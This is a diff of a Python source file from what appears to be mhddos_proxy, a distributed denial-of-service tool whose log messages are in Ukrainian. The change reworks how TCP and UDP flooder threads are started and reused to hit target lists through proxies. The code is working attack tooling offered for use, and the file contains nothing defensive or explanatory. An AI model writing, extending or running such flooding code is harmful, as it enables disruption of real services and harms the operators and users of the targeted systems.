@@ -4,9 +4,11 @@ import colorama; colorama.init()
 from collections import namedtuple
 from contextlib import suppress
 from itertools import cycle
-import random
+from queue import SimpleQueue
+from random import shuffle
 from threading import Event, Thread
 from time import sleep, time
+from typing import List
 
 from src.cli import init_argparse
 from src.concurrency import AtomicCounter, DaemonThreadPool
@@ -24,11 +26,14 @@ Params = namedtuple('Params', 'target, method')
 
 class Flooder(Thread):
 
-    def __init__(self, event, args_list, switch_after: int = WORK_STEALING_DISABLED):
+    def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
         super(Flooder, self).__init__(daemon=True)
-        self._event = event
         self._switch_after = switch_after
-        self._args_list = args_list
+        self._queue = SimpleQueue()
+
+    def enqueue(self, event, args_list):
+        self._queue.put((event, args_list))
+        return self
 
     def run(self):
         """
@@ -53,34 +58,58 @@ class Flooder(Thread):
         be equivalent to the scheduling that was used before the feature was
         introduced (static assignment).
         """
-        runnables = [mhddos_main(**kwargs) for kwargs in self._args_list]
-        random.shuffle(runnables)
-        runnables_iter = cycle(runnables)
-        self._event.wait()
-        while self._event.is_set():
-            runnable = next(runnables_iter)
-            no_switch = self._switch_after == WORK_STEALING_DISABLED
-            alive, cycles_left = True, self._switch_after
-            while self._event.is_set() and (no_switch or alive):
-                try:
-                    alive = runnable.run() > 0 and cycles_left > 0
-                except Exception:
-                    alive = False
-                cycles_left -= 1
+        while True:
+            event, args_list = self._queue.get()
+            runnables = [mhddos_main(**kwargs) for kwargs in args_list]
+            shuffle(runnables)
+            runnables_iter = cycle(runnables)
+            event.wait()
+            while event.is_set():
+                runnable = next(runnables_iter)
+                no_switch = self._switch_after == WORK_STEALING_DISABLED
+                alive, cycles_left = True, self._switch_after
+                while event.is_set() and (no_switch or alive):
+                    try:
+                        alive = runnable.run() > 0 and cycles_left > 0
+                    except Exception:
+                        alive = False
+                    cycles_left -= 1
+
+
+def run_flooders(num_threads, switch_after) -> List[Flooder]:
+    threads = []
+    for _ in range(num_threads):
+        flooder = Flooder(switch_after)
+        try:
+            flooder.start()
+            threads.append(flooder)
+        except RuntimeError:
+            break
+
+    if not threads:
+        logger.warning(
+            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
+        exit()
+
+    if len(threads) < num_threads:
+        logger.warning(
+            f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - "
+            f"лише {len(threads)}{cl.RESET}")
+    
+    return threads
 
 
 def run_ddos(
     proxies,
     targets,
-    total_threads,
+    tcp_flooders,
+    udp_flooders,
     period,
     rpc,
     http_methods,
     vpn_mode,
     debug,
     table,
-    udp_threads,
-    switch_after,
 ):
     statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
 
@@ -123,48 +152,13 @@ def run_ddos(
             raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
+    
+    for flooder in tcp_flooders:
+        flooder.enqueue(event, kwargs_list)
 
-    threads = []
-    # run threads for all targets with TCP port
-    for _ in range(total_threads):
-        flooder = Flooder(event, kwargs_list, switch_after)
-        try:
-            flooder.start()
-            threads.append(flooder)
-        except RuntimeError:
-            break
-
-    if not threads:
-        logger.warning(
-            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
-        exit()
-
-    if len(threads) < total_threads:
-        logger.warning(
-            f"{cl.RED}Не вдалося запустити усі {total_threads} потоків - "
-            f"лише {len(threads)}{cl.RESET}")
-
-    # run threads for all targets with UDP port (if any)
     if udp_kwargs_list:
-        udp_threads_started = 0
-        for _ in range(udp_threads):
-            flooder = Flooder(event, udp_kwargs_list, switch_after)
-            try:
-                flooder.start()
-                threads.append(flooder)
-                udp_threads_started += 1
-            except RuntimeError:
-                break
-
-        if udp_threads_started == 0:
-            logger.warning(
-                f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
-            exit()
-
-        if udp_threads_started < udp_threads:
-            logger.warning(
-                f"{cl.RED}Не вдалося запустити усі {udp_threads} потоків під UDP - "
-                f"лише {udp_threads_started}{cl.RESET}")
+        for flooder in udp_flooders:
+            flooder.enqueue(event, udp_kwargs_list)
 
     event.set()
 
@@ -181,10 +175,8 @@ def run_ddos(
                 break
             show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
             sleep(refresh_rate)
-
+    
     event.clear()
-    for thread in threads:
-        thread.join()
 
 
 def start(args):
@@ -209,6 +201,9 @@ def start(args):
     proxies = []
     is_old_version = not is_latest_version()
     dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
+    udp_flooders = run_flooders(args.udp_threads, WORK_STEALING_DISABLED)
+    tcp_flooders = run_flooders(args.threads, args.switch_after)
+
     while True:
         if is_old_version:
             print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
@@ -243,15 +238,14 @@ def start(args):
         run_ddos(
             proxies,
             targets,
-            args.threads,
+            tcp_flooders,
+            udp_flooders,
             period,
             args.rpc,
             args.http_methods,
             args.vpn_mode,
             args.debug,
             args.table,
-            args.udp_threads,
-            args.switch_after,
         )
 
 
